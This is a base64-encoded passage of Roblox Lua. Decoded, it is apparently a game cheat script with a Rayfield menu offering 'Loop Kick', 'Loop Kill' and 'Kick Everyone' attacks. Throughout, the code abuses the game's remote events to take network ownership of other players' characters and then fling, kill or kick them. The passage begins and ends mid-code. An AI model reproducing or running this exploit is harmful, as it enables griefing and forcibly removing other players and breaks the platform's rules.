ICAgICAgICAgICAgIHRhc2sud2FpdCgwLjE1KQogICAgICAgICAgICAgICAgICAgIGF0dGVtcHRzID0gYXR0ZW1wdHMgKyAxCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYgdGFyZ2V0SGVhZDpGaW5kRmlyc3RDaGlsZCgiUGFydE93bmVyIikgYW5kIHRhcmdldEhlYWQuUGFydE93bmVyLlZhbHVlID09IExvY2FsUGxheWVyLk5hbWUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBnb3RPd25lcnNoaXAgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICB1bnRpbCBhdHRlbXB0cyA+IDE1CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIG15Um9vdC5DRnJhbWUgPSBvcmlnaW5hbFBvc2l0aW9uCiAgICAgICAgICAgICAgICBteVJvb3QuQXNzZW1ibHlMaW5lYXJWZWxvY2l0eSA9IFZlY3RvcjMuemVybwogICAgICAgICAgICAgICAgbXlSb290LkFzc2VtYmx5QW5ndWxhclZlbG9jaXR5ID0gVmVjdG9yMy56ZXJvCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIGdvdE93bmVyc2hpcCB0aGVuCiAgICAgICAgICAgICAgICAgICAgdGFyZ2V0SHVtYW5vaWQuSGVhbHRoID0gMAogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgICAgICAgICAgRGVzdHJveUdyYWJMaW5lOkZpcmVTZXJ2ZXIodGFyZ2V0Um9vdCkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBSYXlmaWVsZDpOb3RpZnkoewogICAgICAgICAgICAgICAgICAgICAgICBUaXRsZSA9ICJTdWNjZXNzIiwKICAgICAgICAgICAgICAgICAgICAgICAgQ29udGVudCA9ICJLaWxsZWQgIiAuLiBzZWxlY3RlZFRhcmdldC5OYW1lLAogICAgICAgICAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDIsCiAgICAgICAgICAgICAgICAgICAgICAgIEltYWdlID0gNDQ4MzM2MjQ1OCwKICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIG15Um9vdCB0aGVuCiAgICAgICAgICAgICAgICBteVJvb3QuQ0ZyYW1lID0gb3JpZ2luYWxQb3NpdGlvbgogICAgICAgICAgICAgICAgbXlSb290LkFzc2VtYmx5TGluZWFyVmVsb2NpdHkgPSBWZWN0b3IzLnplcm8KICAgICAgICAgICAgICAgIG15Um9vdC5Bc3NlbWJseUFuZ3VsYXJWZWxvY2l0eSA9IFZlY3RvcjMuemVybwogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKfSkKCkF0dGFja1RhYjpDcmVhdGVUb2dnbGUoewogICAgTmFtZSA9ICJMb29wIEtpY2siLAogICAgQ3VycmVudFZhbHVlID0gZmFsc2UsCiAgICBGbGFnID0gIkxvb3BLaWNrIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oVmFsdWUpCiAgICAgICAgbG9vcEtpY2tTZXR0aW5ncy5FID0gVmFsdWUKICAgICAgICBpZiBWYWx1ZSB0aGVuCiAgICAgICAgICAgIGxvb3BLaWNrQ29ubiA9IGxvb3BDdHJsKGxvb3BLaWNrU2V0dGluZ3MsIGZhbHNlKQogICAgICAgICAgICBSYXlmaWVsZDpOb3RpZnkoewogICAgICAgICAgICAgICAgVGl0bGUgPSAiTG9vcCBLaWNrIiwKICAgICAgICAgICAgICAgIENvbnRlbnQgPSAiRW5hYmxlZCIsCiAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDIsCiAgICAgICAgICAgICAgICBJbWFnZSA9IDQ0ODMzNjI0NTgsCiAgICAgICAgICAgIH0pCiAgICAgICAgZWxzZQogICAgICAgICAgICBzdG9wTG9vcChsb29wS2lja0Nvbm4sIGxvb3BLaWNrU2V0dGluZ3MpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCkF0dGFja1RhYjpDcmVhdGVUb2dnbGUoewogICAgTmFtZSA9ICJMb29wIEtpbGwiLAogICAgQ3VycmVudFZhbHVlID0gZmFsc2UsCiAgICBGbGFnID0gIkxvb3BLaWxsIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oVmFsdWUpCiAgICAgICAgbG9vcEtpbGxTZXR0aW5ncy5FID0gVmFsdWUKICAgICAgICBpZiBWYWx1ZSB0aGVuCiAgICAgICAgICAgIGxvb3BLaWxsQ29ubiA9IGxvb3BDdHJsKGxvb3BLaWxsU2V0dGluZ3MsIHRydWUpCiAgICAgICAgICAgIFJheWZpZWxkOk5vdGlmeSh7CiAgICAgICAgICAgICAgICBUaXRsZSA9ICJMb29wIEtpbGwiLAogICAgICAgICAgICAgICAgQ29udGVudCA9ICJFbmFibGVkIiwKICAgICAgICAgICAgICAgIER1cmF0aW9uID0gMiwKICAgICAgICAgICAgICAgIEltYWdlID0gNDQ4MzM2MjQ1OCwKICAgICAgICAgICAgfSkKICAgICAgICBlbHNlCiAgICAgICAgICAgIHN0b3BMb29wKGxvb3BLaWxsQ29ubiwgbG9vcEtpbGxTZXR0aW5ncykKICAgICAgICBlbmQKICAgIGVuZAp9KQoKbG9jYWwgQWxsUGxheWVyU2VjdGlvbiA9IEF0dGFja1RhYjpDcmVhdGVTZWN0aW9uKCJNYXNzIEF0dGFja3MiKQoKQXR0YWNrVGFiOkNyZWF0ZVRvZ2dsZSh7CiAgICBOYW1lID0gIktpY2sgRXZlcnlvbmUiLAogICAgQ3VycmVudFZhbHVlID0gZmFsc2UsCiAgICBGbGFnID0gIktpY2tBbGwiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihWYWx1ZSkKICAgICAgICBpZiBWYWx1ZSB0aGVuCiAgICAgICAgICAgIFJheWZpZWxkOk5vdGlmeSh7CiAgICAgICAgICAgICAgICBUaXRsZSA9ICJLaWNrIEFsbCIsCiAgICAgICAgICAgICAgICBDb250ZW50ID0gIktpY2tpbmcgZXZlcnlvbmUiLAogICAgICAgICAgICAgICAgRHVyYXRpb24gPSAzLAogICAgICAgICAgICAgICAgSW1hZ2UgPSA0NDgzMzYyNDU4LAogICAgICAgICAgICB9KQogICAgICAgICAgICAKICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBsb2NhbCBNYWluQ2hhcmFjdGVyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICBsb2NhbCBNYWluSHVtYW5vaWQgPSBNYWluQ2hhcmFjdGVyIGFuZCBNYWluQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgICAgICAgICAgICAgbG9jYWwgTWFpbkhycCA9IE1haW5DaGFyYWN0ZXIgYW5kIE1haW5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBub3QgTWFpbkNoYXJhY3RlciBvciBub3QgTWFpbkh1bWFub2lkIG9yIG5vdCBNYWluSHJwIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsb2NhbCBpbml0aWFsUG9zaXRpb24gPSBNYWluSHJwLlBvc2l0aW9uCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxvY2FsIGxvY2FsVEZvbGRlciA9IFdvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZChMb2NhbFBsYXllci5OYW1lIC4uICJTcGF3bmVkSW5Ub3lzIikKICAgICAgICAgICAgICAgIGlmIG5vdCBsb2NhbFRGb2xkZXIgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxvY2FsIGZ1bmN0aW9uIHNwYXduT2JqZWN0KG5hbWUpCiAgICAgICAgICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGhycDIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIgYW5kIExvY2FsUGxheWVyLkNoYXJhY3RlcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgaHJwMiB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgc3Bhd25Qb3NpdGlvbiA9IGhycDIuUG9zaXRpb24KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgb2Zmc2V0ID0gVmVjdG9yMy5uZXcoMCwwLDEyKQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBzcGF3bkNGcmFtZSA9IENGcmFtZS5uZXcoc3Bhd25Qb3NpdGlvbiArIG9mZnNldCkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgc3Bhd25WZWxvY2l0eSA9IFZlY3RvcjMuemVybwogICAgICAgICAgICAgICAgICAgICAgICBSZXBsaWNhdGVkU3RvcmFnZS5NZW51VG95cy5TcGF3blRveVJlbW90ZUZ1bmN0aW9uOkludm9rZVNlcnZlcihuYW1lLCBzcGF3bkNGcmFtZSwgc3Bhd25WZWxvY2l0eSkKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbG9jYWwgc2l0dGluZ29uYmxvYm1hbiA9IE1haW5IdW1hbm9pZCBhbmQgTWFpbkh1bWFub2lkLlNpdCBvciBmYWxzZQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBub3Qgc2l0dGluZ29uYmxvYm1hbiB0aGVuCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIGJsb2JtYW5zIGluIGlwYWlycyhsb2NhbFRGb2xkZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgYmxvYm1hbnMuTmFtZSA9PSAiQ3JlYXR1cmVCbG9ibWFuIiBvciBibG9ibWFucy5OYW1lID09ICJtZXRob2QiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIENoYXJhY3RlckV2ZW50cy5EZWxldGVUb3k6RmlyZVNlcnZlcihibG9ibWFucykKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgd2hpbGUgbG9jYWxURm9sZGVyOkZpbmRGaXJzdENoaWxkKCJDcmVhdHVyZUJsb2JtYW4iKSBvciBsb2NhbFRGb2xkZXI6RmluZEZpcnN0Q2hpbGQoIm1ldGhvZCIpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfLCBibG9ibWFucyBpbiBpcGFpcnMobG9jYWxURm9sZGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBibG9ibWFucy5OYW1lID09ICJDcmVhdHVyZUJsb2JtYW4iIG9yIGJsb2JtYW5zLk5hbWUgPT0gIm1ldGhvZCIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENoYXJhY3RlckV2ZW50cy5EZWxldGVUb3k6RmlyZVNlcnZlcihibG9ibWFucykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBzcGF3bk9iamVjdCgiQ3JlYXR1cmVCbG9ibWFuIikKICAgICAgICAgICAgICAgICAgICBsb2NhbCBibG9ibWFuID0gbG9jYWxURm9sZGVyOldhaXRGb3JDaGlsZCgiQ3JlYXR1cmVCbG9ibWFuIiwgMykKICAgICAgICAgICAgICAgICAgICBsb2NhbCBzdGFyeWdlaXJvZ2plcmlvID0gdGljaygpCiAgICAgICAgICAgICAgICAgICAgd2hpbGUgdGljaygpIC0gc3RhcnlnZWlyb2dqZXJpbyA8IDEgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IGJsb2JtYW4gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3Bhd25PYmplY3QoIkNyZWF0dXJlQmxvYm1hbiIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBibG9ibWFuID0gbG9jYWxURm9sZGVyOldhaXRGb3JDaGlsZCgiQ3JlYXR1cmVCbG9ibWFuIiwgMykKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbG9jYWwgc2VhdAogICAgICAgICAgICAgICAgbG9jYWwgc3Bhd25lZFRveXMgPSBXb3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQoTG9jYWxQbGF5ZXIuTmFtZSAuLiAiU3Bhd25lZEluVG95cyIpCiAgICAgICAgICAgICAgICBsb2NhbCBibG9ibWFuID0gc3Bhd25lZFRveXM6V2FpdEZvckNoaWxkKCJDcmVhdHVyZUJsb2JtYW4iLCAzKQogICAgICAgICAgICAgICAgaWYgc3Bhd25lZFRveXMgdGhlbgogICAgICAgICAgICAgICAgICAgIGlmIGJsb2JtYW4gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBzZWF0ID0gYmxvYm1hbjpXYWl0Rm9yQ2hpbGQoIlZlaGljbGVTZWF0IiwgMykKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBub3QgYmxvYm1hbiB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIHRpbWVvdXQgPSB0aWNrKCkKICAgICAgICAgICAgICAgICAgICB3aGlsZSB0aWNrKCkgLSB0aW1lb3V0IDwgMC41IGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBzZWF0IG9yIG5vdCBzZWF0LlBhcmVudCB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IE1haW5IdW1hbm9pZCBvciBub3QgTWFpbkh1bWFub2lkLlBhcmVudCB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IE1haW5IcnAgb3Igbm90IE1haW5IcnAuUGFyZW50IHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgTWFpbkNoYXJhY3RlciBvciBub3QgTWFpbkNoYXJhY3Rlci5QYXJlbnQgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBNYWluQ2hhcmFjdGVyOlBpdm90VG8oQ0ZyYW1lLm5ldyhzZWF0LlBvc2l0aW9uKSkKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBNYWluSHVtYW5vaWQuU2l0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlYXQ6U2l0KE1haW5IdW1hbm9pZCkKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBmb3IgXywgcGxheTEyM2VycyBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgcGxheTEyM2VycyB+PSBMb2NhbFBsYXllciB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGlzSW5QbG90KHBsYXkxMjNlcnMpIHRoZW4gY29udGludWUgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRjaGFyYWN0ZXIgPSBwbGF5MTIzZXJzLkNoYXJhY3RlciBvciBwbGF5MTIzZXJzLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICBpZiB0YXJnZXRjaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0aHJwID0gdGFyZ2V0Y2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldGh1bWFub2lkID0gdGFyZ2V0Y2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdGFyZ2V0aHJwIGFuZCB0YXJnZXRodW1hbm9pZCBhbmQgKE1haW5IcnAgYW5kIE1haW5IdW1hbm9pZCkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRhcmdldGhycC5NYXNzbGVzcyB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRhcmdldGhycC5Qb3NpdGlvbi5ZID49IDM1MDAwIG9yIHRhcmdldGhycC5Bc3NlbWJseUxpbmVhclZlbG9jaXR5Lk1hZ25pdHVkZSA+PSAxMDAwMDAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIG5ldHdvcmtjb25uCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwga2lja2F1cmF2ZWxvY2l0eSA9IEluc3RhbmNlLm5ldygiQm9keVZlbG9jaXR5IikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBraWNrYXVyYXZlbG9jaXR5LlZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoMCwgMjUwLCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGtpY2thdXJhdmVsb2NpdHkuTWF4Rm9yY2UgPSBWZWN0b3IzLm5ldygwLCAxMjUwMCwgMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBraWNrYXVyYXZlbG9jaXR5LlAgPSAxMjUwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAga2lja2F1cmF2ZWxvY2l0eS5QYXJlbnQgPSB0YXJnZXRocnAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuZXR3b3JrY29ubiA9IFJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IHRhcmdldGhycCBvciBub3QgTWFpbkhycCBvciBub3QgTWFpbkh1bWFub2lkLlNpdCBvciBub3QgbG9jYWxURm9sZGVyOkZpbmRGaXJzdENoaWxkKCJDcmVhdHVyZUJsb2JtYW4iKSB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgbXlQb3MgPSBNYWluSHJwLlBvc2l0aW9uCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIG90aFBvcyA9IHRhcmdldGhycC5Qb3NpdGlvbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBkaXN0YW5jZSA9IChteVBvcyAtIG90aFBvcykuTWFnbml0dWRlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkaXN0YW5jZSA+IDE1IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE1haW5DaGFyYWN0ZXI6UGl2b3RUbyhDRnJhbWUubmV3KHRhcmdldGhycC5Qb3NpdGlvbiArIFZlY3RvcjMubmV3KC0xMCwgNCwgMCkpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGRpc3RhbmNlIDwgNTAgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU2V0TmV0d29ya093bmVyOkZpcmVTZXJ2ZXIodGFyZ2V0aHJwLCB0YXJnZXRocnAuQ0ZyYW1lKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgbG9ja2Rvd253ZW9wZmtldyA9IHRpY2soKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIHRpY2soKSAtIGxvY2tkb3dud2VvcGZrZXcgPCAzIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0YXJnZXRjaGFyYWN0ZXIuUGFyZW50IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5ldHdvcmtjb25uIHRoZW4gbmV0d29ya2Nvbm46RGlzY29ubmVjdCgpIG5ldHdvcmtjb25uID0gbmlsIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgdGFyZ2V0Y2hhcmFjdGVyIG9yIG5vdCB0YXJnZXRjaGFyYWN0ZXIuUGFyZW50IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5ldHdvcmtjb25uIHRoZW4gbmV0d29ya2Nvbm46RGlzY29ubmVjdCgpIG5ldHdvcmtjb25uID0gbmlsIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBoZWFkID0gdGFyZ2V0Y2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIZWFkIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgaGVhZCBhbmQgaGVhZDpGaW5kRmlyc3RDaGlsZCgiUGFydE93bmVyIikgdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRocnBvcmd5cG9zID0gdGFyZ2V0aHJwLlBvc2l0aW9uLlkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB0aW1lb3V0ID0gdGljaygpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVwZWF0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0YXJnZXRjaGFyYWN0ZXIuUGFyZW50IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGtpY2thdXJhdmVsb2NpdHkgYW5kIGtpY2thdXJhdmVsb2NpdHkuUGFyZW50IHRoZW4ga2lja2F1cmF2ZWxvY2l0eTpEZXN0cm95KCkgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0YXJnZXRocnAgb3Igbm90IHRhcmdldGhycC5QYXJlbnQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYga2lja2F1cmF2ZWxvY2l0eSBhbmQga2lja2F1cmF2ZWxvY2l0eS5QYXJlbnQgdGhlbiBraWNrYXVyYXZlbG9jaXR5OkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdGljaygpIC0gdGltZW91dCA+IDEgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdW50aWwgdGFyZ2V0aHJwLlBvc2l0aW9uLlkgPj0gdGFyZ2V0aHJwb3JneXBvcyArIDIwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JhYkV2ZW50cy5FbmRHcmFiRWFybHk6RmlyZVNlcnZlcih0YXJnZXRocnApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JhYkV2ZW50cy5EZXN0cm95R3JhYkxpbmU6RmlyZVNlcnZlcih0YXJnZXRocnApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbmV0d29ya2Nvbm4gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuZXR3b3JrY29ubjpEaXNjb25uZWN0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbmV0d29ya2Nvbm4gPSBuaWwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBraWNrYXVyYXZlbG9jaXR5IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAga2lja2F1cmF2ZWxvY2l0eTpEZXN0cm95KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBNYWluSHJwIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTWFpbkhycC5BbmNob3JlZCA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wNSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBibG9ibWFuOlBpdm90VG8oQ0ZyYW1lLm5ldyh0YXJnZXRocnAuUG9zaXRpb24gKyBWZWN0b3IzLm5ldygtMTAsIDQsIDApKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCB0aW1lb3V0dGhpbmd5ID0gdGljaygpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgbGVmdERldGVjdG9yID0gYmxvYm1hbjpGaW5kRmlyc3RDaGlsZCgiTGVmdERldGVjdG9yIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBsZWZ0V2VsZCA9IGxlZnREZXRlY3RvciBhbmQgbGVmdERldGVjdG9yOkZpbmRGaXJzdENoaWxkKCJMZWZ0V2VsZCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYW